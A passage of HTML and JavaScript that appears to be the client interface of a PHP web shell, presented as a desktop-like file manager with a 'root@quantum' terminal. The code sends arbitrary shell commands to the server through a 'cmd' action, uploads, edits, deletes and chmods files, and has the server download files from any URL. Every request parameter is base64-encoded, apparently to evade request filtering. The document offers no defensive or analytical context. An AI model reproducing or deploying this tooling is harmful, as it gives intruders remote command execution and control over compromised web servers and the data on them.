                            metaHtml = `<div class="f-meta"><span>${item.size}</span> <span class="dot"></span><span style="color: ${permColor}; font-weight: 600;">${item.perms}</span> <span class="dot"></span><span>${item.mtime}</span></div>`;
                            actionsHtml = `<div class="row-actions"><button class="act-btn" onclick="event.stopPropagation(); showActionMenu(event, '${jsName}', '${item.type}')" title="Options">${svgMore}</button></div>`;
                        }
                        
                        row.innerHTML = `<div class="f-main"><div class="f-icon">${getSvg(item.type, item.ext)}</div><div class="f-info"><div class="f-name">${htmlName}</div>${metaHtml}</div></div>${actionsHtml}`;
                        if (item.type === 'dir') { row.addEventListener('click', (e) => { e.stopPropagation(); let newPath = currentPath + '/' + item.name; if (item.name === '..') newPath = currentPath.split('/').slice(0, -1).join('/'); fetchFileSystem(newPath); }); }
                        fsView.appendChild(row);
                    });
                    setTimeout(() => {
                        const maxScroll = fsView.scrollHeight - fsView.clientHeight; const sliderWrap = document.getElementById('path-slider'); const input = document.getElementById('path-slider-input');
                        if(sliderWrap && input && fsView) {
                            sliderWrap.style.display = 'grid';
                            if(maxScroll > 0) { input.max = maxScroll; input.value = fsView.scrollTop; } else { input.max = 100; input.value = 100; }
                            input.dispatchEvent(new Event('input'));
                        }
                    }, 50);
                } else { showToast(json.msg || 'Directory restricted', 'error'); }
            } catch (err) { 
                if (expHeader) expHeader.style.display = 'flex'; fsView.innerHTML = '<div class="loading-state" style="color:red; text-align:center; padding:20px;">CONNECTION ERROR</div>'; showToast('Network error', 'error'); 
            }
        }
        function currentPathBuildTarget(pathTarget) { return pathTarget; }

        const osLayer = document.getElementById('os-dialog-layer'); const osInput = document.getElementById('os-d-input'); let osCallback = null;
        function apiPrompt(title, placeholder, callback) { document.getElementById('os-d-title').innerText = title; osInput.value = ''; osInput.placeholder = placeholder; osCallback = callback; osLayer.classList.add('active'); setTimeout(() => osInput.focus(), 100); }
        function closeOsDialog() { osLayer.classList.remove('active'); osCallback = null; }
        document.getElementById('os-d-confirm').addEventListener('click', () => { if (osCallback) osCallback(osInput.value); closeOsDialog(); });
        osInput.addEventListener('keypress', e => { if (e.key === 'Enter') { if (osCallback) osCallback(osInput.value); closeOsDialog(); }});

        // BASE64 POST SENDER
        async function runApiObj(dataObj, successMessage) {
            try {
                let fd = new FormData();
                for (let key in dataObj) { fd.append(key, b64EncodeUnicode(dataObj[key])); }
                const res = await fetch('?api=1', { method: 'POST', body: fd }); const json = await res.json();
                if (json.status === 'ok') { showToast(successMessage, 'success'); fetchFileSystem(currentPath); } else { showToast(json.msg || 'Error', 'error'); }
            } catch(e) { showToast('Failed to connect', 'error'); }
        }

        function apiMkdir(name) { if(!name) return; runApiObj({action: 'mkdir', path: currentPath, name: name}, 'Folder created'); }
        function apiTouch(name) { if(!name) return; runApiObj({action: 'touch', path: currentPath, name: name}, 'File created'); }
        function apiDelete(target) { runApiObj({action: 'delete', path: currentPath, target: target}, 'Deleted'); }
        function apiRename(target, newName) { if(!newName || target===newName) return; runApiObj({action: 'rename', path: currentPath, target: target, new_name: newName}, 'Renamed'); }
        function apiChmod(target, perms) { if(!perms) return; runApiObj({action: 'chmod', path: currentPath, target: target, perms: perms}, 'Chmod updated'); }

        async function apiUpload(file) {
            if(!file) return; showToast('Reading file...', 'success');
            const reader = new FileReader();
            reader.onload = async (e) => {
                const b64Data = e.target.result.split(',')[1];
                let fd = new FormData();
                fd.append('action', b64EncodeUnicode('upload_b64'));
                fd.append('path', b64EncodeUnicode(currentPath));
                fd.append('filename', b64EncodeUnicode(file.name));
                fd.append('file_data', b64Data);
                try {
                    showToast('Uploading...', 'success');
                    const res = await fetch('?api=1', { method: 'POST', body: fd }); const json = await res.json();
                    if(json.status === 'ok') { showToast('Uploaded', 'success'); fetchFileSystem(currentPath); } else showToast(json.msg, 'error');
                } catch(e) { showToast('Upload failed', 'error'); }
                document.getElementById('sys-upload').value = '';
            };
            reader.readAsDataURL(file);
        }

        async function apiReadAndEdit(target) {
            try {
                const res = await fetch(`?api=1&action=read&path=${encodeURIComponent(currentPath)}&target=${encodeURIComponent(target)}`);
                const json = await res.json(); if(json.status !== 'ok') return showToast(json.msg, 'error');
                const winId = 'win-edit-' + target.replace(/[^a-zA-Z0-9]/g, '');
                const safeContent = json.content.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                createWindow(winId, `Editor - ${target}`, `<div class="editor-layout"><div class="editor-toolbar" style="gap: 8px;"><button class="tb-btn" onclick="document.getElementById('${winId}').remove()" style="padding: 6px 10px; background: rgba(255,255,255,0.1); color: #fff;" title="Cancel"><svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button><button class="tb-btn btn-save" onclick="apiSaveFile('${target}', this.parentElement.nextElementSibling.value, '${winId}')" style="padding: 6px 10px; background: var(--accent-dim); color: #000;" title="Save"><svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path><polyline points="17 21 17 13 7 13 7 21"></polyline><polyline points="7 3 7 8 15 8"></polyline></svg></button></div><textarea class="editor-textarea" spellcheck="false">${safeContent}</textarea></div>`, 600, 500, 'float-term'); 
            } catch (e) { showToast('Read error', 'error'); }
        }

        async function apiSaveFile(target, content, winId) {
            let fd = new FormData(); fd.append('action', b64EncodeUnicode('edit')); fd.append('path', b64EncodeUnicode(currentPath)); fd.append('target', b64EncodeUnicode(target)); fd.append('content', b64EncodeUnicode(content));
            try { const res = await fetch('?api=1', { method: 'POST', body: fd }); const json = await res.json(); if (json.status === 'ok') { showToast('Saved', 'success'); document.getElementById(winId).remove(); fetchFileSystem(currentPath); } else { showToast('Save failed', 'error'); } } catch (e) { showToast('Failed', 'error'); }
        }

        async function apiCmd(command) {
            const outBox = document.getElementById('term-out'); outBox.innerHTML += `root@quantum:~# ${command}\n`;
            let fd = new FormData(); fd.append('action', b64EncodeUnicode('cmd')); fd.append('cmd', b64EncodeUnicode(command));
            try { const res = await fetch('?api=1', { method: 'POST', body: fd }); const json = await res.json(); if(json.status === 'ok') showToast('Executed', 'success'); else showToast('Failed', 'error'); outBox.innerHTML += `${json.output}\n`; outBox.scrollTop = outBox.scrollHeight; } catch (err) { outBox.innerHTML += `[Error]\n`; showToast('Error', 'error'); }
        }

        window.onload = () => launchApp('explorer');

        function toggleCardMenu(btn) { const holder = document.getElementById('card-holder'); const overlay = document.getElementById('card-overlay'); const isOpen = holder.classList.toggle('mobile-open'); overlay.classList.toggle('active', isOpen); if (btn) btn.classList.toggle('is-open', isOpen); }
        function closeCardMenu() { const holder = document.getElementById('card-holder'); const overlay = document.getElementById('card-overlay'); holder.classList.remove('mobile-open'); overlay.classList.remove('active'); const hbBtn = document.getElementById('win-hb-btn'); if (hbBtn) hbBtn.classList.remove('is-open'); }
        
        function cardAction(action) {
            closeCardMenu();
            if (action === 'home')         { fetchFileSystem(''); }
            else if (action === 'upload')  { document.getElementById('sys-upload').click(); }
            else if (action === 'cmd')     { launchApp('terminal'); }
            else if (action === 'download'){ apiPrompt('Download from URL', 'https://example.com/file.zip', apiDownloadUrl); }
            else if (action === 'item4')   { apiPrompt('Chmod Target', 'filename.php', (name) => { if(name) apiPrompt('Chmod Perms', '0755', (p) => apiChmod(name, p)); }); }
            else if (action === 'item5')   { apiPrompt('New Folder', 'folder_name', apiMkdir); }
            else if (action === 'item6')   { apiPrompt('New File', 'file.txt', apiTouch); }
        }

        async function apiDownloadUrl(url) {
            if (!url) return; showToast('Downloading via cURL/FGC...', 'success');
            let fd = new FormData(); fd.append('action', b64EncodeUnicode('download_url')); fd.append('path', b64EncodeUnicode(currentPath)); fd.append('url', b64EncodeUnicode(url));
            try { const res = await fetch('?api=1', { method: 'POST', body: fd }); const json = await res.json(); if (json.status === 'ok') { showToast('Downloaded: ' + json.filename, 'success'); fetchFileSystem(currentPath); } else { showToast(json.msg || 'Download failed', 'error'); } } catch(e) { showToast('Download error', 'error'); }
        }
    </script>
</body>
</html>
